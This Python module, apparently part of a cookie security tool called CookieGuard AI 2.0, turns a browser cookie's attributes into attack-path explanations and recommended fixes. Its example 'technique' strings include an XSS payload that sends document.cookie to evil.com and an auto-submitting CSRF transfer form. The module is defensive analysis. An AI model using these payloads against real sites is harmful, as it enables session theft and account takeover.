"""
CookieGuard AI 2.0 - Attack Simulation Engine
Generates per-cookie attack path analysis based on cookie attributes and classification.
"""

from typing import Dict, List


def simulate_attacks(
    cookie: Dict,
    classification_type: str,
    risk_severity: str,
    risk_issues: List[Dict],
    features: Dict = None,
) -> Dict:
    """
    Simulate attack paths for a given cookie based on its security attributes.
    
    Args:
        cookie: Raw cookie attributes dict
        classification_type: ML classification type
        risk_severity: Risk severity from scorer
        risk_issues: Issue list from scorer
        features: Optional extracted features dict
    
    Returns:
        Dict with 'paths', 'impact', 'overall_risk', 'fixes'
    """
    features = features or {}
    paths = []
    fixes = []
    impacts = []

    is_auth = classification_type == 'authentication'
    name = cookie.get('name', '')
    domain = cookie.get('domain', '')
    secure = bool(cookie.get('secure', False))
    http_only = bool(cookie.get('httpOnly', False))
    same_site = (cookie.get('sameSite') or '').lower()
    expiry = cookie.get('expirationDate')

    # ── Attack Path 1: XSS Cookie Theft ──────────────────────
    if not http_only:
        severity = 'critical' if is_auth else 'medium'
        paths.append({
            'type': 'XSS',
            'name': 'Cross-Site Scripting (Cookie Theft)',
            'severity': severity,
            'description': (
                f'An attacker who finds an XSS vulnerability can execute '
                f'`document.cookie` to read "{name}". '
                f'{"This is an authentication cookie — stolen tokens allow full account takeover." if is_auth else "Cookie value could be exfiltrated."}'
            ),
            'technique': 'Inject <script>fetch("https://evil.com?c="+document.cookie)</script> via XSS vector',
            'precondition': 'XSS vulnerability exists on the site',
        })
        fixes.append({
            'fix': 'Use a script-blocking extension',
            'impact': 'Reduces XSS risk by blocking inline scripts from untrusted sources',
            'effort': 'Low',
            'code': 'Install uBlock Origin or NoScript to limit JavaScript execution',
            'site_should_fix': f'Set-Cookie: {name}=...; HttpOnly',
        })

    # ── Attack Path 2: CSRF ──────────────────────────────────
    if not same_site or same_site in ('none', 'no_restriction'):
        severity = 'high' if is_auth else 'low'
        paths.append({
            'type': 'CSRF',
            'name': 'Cross-Site Request Forgery',
            'severity': severity,
            'description': (
                f'Cookie "{name}" is sent with cross-site requests (SameSite={same_site or "not set"}). '
                f'An attacker can craft a malicious page that triggers authenticated requests on behalf of the user.'
            ),
            'technique': (
                'Host a page with: <form action="https://target.com/transfer" method="POST">'
                '<input type="hidden" name="amount" value="10000"></form>'
                '<script>document.forms[0].submit()</script>'
            ),
            'precondition': 'User visits attacker-controlled page while logged in',
        })
        fixes.append({
            'fix': 'Avoid clicking untrusted links while logged in',
            'impact': 'CSRF requires you to visit a malicious page — staying cautious limits exposure',
            'effort': 'Low',
            'code': 'Log out of sensitive sites before browsing untrusted content',
            'site_should_fix': f'Set-Cookie: {name}=...; SameSite=Lax',
        })

    # ── Attack Path 3: Subdomain Takeover ────────────────────
    if domain.startswith('.') or (features.get('f_subdomain_shared', 0) and is_auth):
        paths.append({
            'type': 'SUBDOMAIN',
            'name': 'Subdomain Takeover / Cookie Tossing',
            'severity': 'high' if is_auth else 'medium',
            'description': (
                f'Cookie "{name}" is scoped to wildcard domain "{domain}". '
                f'If an attacker gains control of ANY subdomain (e.g., via dangling DNS, '
                f'abandoned CNAME, or shared hosting), they can read or overwrite this cookie. '
                f'{"Auth token theft enables account takeover." if is_auth else "Cookie manipulation possible."}'
            ),
            'technique': (
                f'1. Find unused subdomain of {domain.lstrip(".")} (e.g., old-staging.{domain.lstrip(".")})\n'
                f'2. Claim the subdomain via cloud provider\n'
                f'3. Set up page that reads document.cookie or sets a malicious replacement'
            ),
            'precondition': f'Attacker controls a subdomain of {domain.lstrip(".")}',
        })
        fixes.append({
            'fix': 'Clear cookies after sensitive sessions',
            'impact': 'Limits window for subdomain-based cookie theft',
            'effort': 'Low',
            'code': 'Use browser settings → Clear cookies on exit, or clear manually after banking/sensitive logins',
            'site_should_fix': f'Set-Cookie: {name}=...; Domain={domain.lstrip(".")}  (or omit Domain entirely)',
        })
        if not name.startswith('__Host-'):
            fixes.append({
                'fix': 'Report to site security team',
                'impact': 'Wildcard auth cookies are a known risk — sites should use __Host- prefix',
                'effort': 'Medium',
                'code': 'Contact the site\'s security team or use their bug bounty program to report this finding',
                'site_should_fix': f'Set-Cookie: __Host-{name}=...; Secure; Path=/',
            })

    # ── Attack Path 4: Network Sniffing ──────────────────────
    if not secure:
        severity = 'high' if is_auth else 'low'
        paths.append({
            'type': 'NETWORK',
            'name': 'Network Interception (Man-in-the-Middle)',
            'severity': severity,
            'description': (
                f'Cookie "{name}" is transmitted over unencrypted HTTP. '
                f'On public WiFi or compromised networks, an attacker can intercept the cookie '
                f'using tools like Wireshark or mitmproxy. '
                f'{"Authentication token theft allows session hijacking." if is_auth else "Cookie value exposed."}'
            ),
            'technique': 'ARP spoof + packet capture on same network, or rogue WiFi access point',
            'precondition': 'User on shared/compromised network + any HTTP request to site',
        })
        fixes.append({
            'fix': 'Avoid this site on public WiFi or use a VPN',
            'impact': 'Encrypts your traffic so cookies cannot be intercepted on the network',
            'effort': 'Low',
            'code': 'Enable HTTPS-only mode in browser settings, or use a trusted VPN on public networks',
            'site_should_fix': f'Set-Cookie: {name}=...; Secure',
        })

    # ── Attack Path 5: Prolonged Exposure Window ─────────────
    if expiry:
        try:
            import time
            if isinstance(expiry, (int, float)):
                days = max((expiry - time.time()) / 86400, 0)
            else:
                days = 30  # fallback
        except Exception:
            days = 30

        if days > 30 and is_auth:
            paths.append({
                'type': 'REPLAY',
                'name': 'Session Replay (Long-Lived Token)',
                'severity': 'medium',
                'description': (
                    f'Cookie "{name}" expires in ~{int(days)} days. '
                    f'If stolen, the attacker has a {int(days)}-day window to replay the session token '
                    f'before it expires — even if the user changes their password.'
                ),
                'technique': 'Stolen cookie is replayed via browser extension or curl to maintain access',
                'precondition': 'Cookie has already been stolen via one of the above methods',
            })
            fixes.append({
                'fix': 'Log out manually and clear cookies regularly',
                'impact': 'Invalidates the session token so it cannot be replayed even if stolen',
                'effort': 'Low',
                'code': f'Log out after each session; use browser "Clear cookies on exit" setting',
                'site_should_fix': f'Set-Cookie: {name}=...; Max-Age=86400  (1 day instead of {int(days)})',
            })

    # ── Overall impact assessment ────────────────────────────
    if is_auth and len(paths) >= 2:
        overall = 'CRITICAL — Multiple attack vectors can lead to account takeover'
    elif is_auth and len(paths) == 1:
        overall = 'HIGH — Single attack vector could compromise authentication'
    elif paths:
        overall = 'MODERATE — Attack paths exist but limited impact for non-auth cookie'
    else:
        overall = 'LOW — No significant attack vectors identified'

    # Deduplicate fixes
    seen_fixes = set()
    unique_fixes = []
    for f in fixes:
        if f['fix'] not in seen_fixes:
            seen_fixes.add(f['fix'])
            unique_fixes.append(f)

    return {
        'paths': paths,
        'path_count': len(paths),
        'overall_risk': overall,
        'impact': _summarize_impact(paths, is_auth),
        'fixes': unique_fixes,
        'attack_surface_score': min(len(paths) * 25, 100),
    }


def _summarize_impact(paths: List[Dict], is_auth: bool) -> str:
    """Generate a one-sentence impact summary."""
    types = [p['type'] for p in paths]

    if not types:
        return "No actionable attack vectors detected for this cookie."

    if is_auth:
        if 'XSS' in types and 'CSRF' in types:
            return "Attacker can steal session via XSS and perform actions via CSRF — full account compromise possible."
        if 'XSS' in types:
            return "Attacker can steal authentication token via XSS — direct account takeover."
        if 'CSRF' in types:
            return "Attacker can perform authenticated actions on behalf of the user via CSRF."
        if 'NETWORK' in types:
            return "Session token exposed to network interception — hijacking possible on insecure connections."
        if 'SUBDOMAIN' in types:
            return "Subdomain compromise can lead to cookie theft and session hijacking."

    return f"{len(types)} potential attack vector(s) identified. See individual paths for details."
